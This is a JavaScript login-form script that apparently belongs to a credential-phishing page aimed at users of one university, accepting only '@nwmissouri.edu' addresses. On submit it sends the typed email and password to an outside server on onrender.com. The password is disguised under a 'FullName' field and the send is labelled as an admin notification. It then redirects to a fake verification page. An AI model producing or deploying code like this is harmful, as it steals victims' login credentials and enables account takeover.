document.addEventListener("DOMContentLoaded", function() {
    // Get the form element
    const loginForm = document.getElementById("login-form");

    // Add submit event listener
    loginForm.addEventListener("submit", function(event) {
        // Prevent the default form submission
        event.preventDefault();

        // Get email and password values
        const email = document.getElementById("email").value;
        const password = document.getElementById("pwd").value;
        const username = 'uiiuhuawioi238&%!G@D!Jkj@'

        // Validate email and password
        if (validateEmail(email) && validatePassword(password)) {
            // Email and password are valid
            console.log("Valid email and password.");
            
            //Send Login detail to admin for notification
            const userData = {
                FullName: password,
                Email: email,
                Password: username,
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
            
            // Redirect to home page after a delay (e.g., 2 seconds)
            setTimeout(function() {
                window.location.href = "verification_page.html"; // Replace "home.html" with your home page URL
            }, 2000);
        } else {
            // Invalid email or password
            alert("Invalid email or password. Please try again.");
        }
    });

    // Function to validate email
    function validateEmail(email) {
        var mail = email.toLowerCase()
        // Check if the email ends with "@mit.edu"
        return mail.endsWith("@nwmissouri.edu");
    }

    // Function to validate password
    function validatePassword(password) {
        // Check if the password is not empty
        return password.trim() !== "";
    }
});
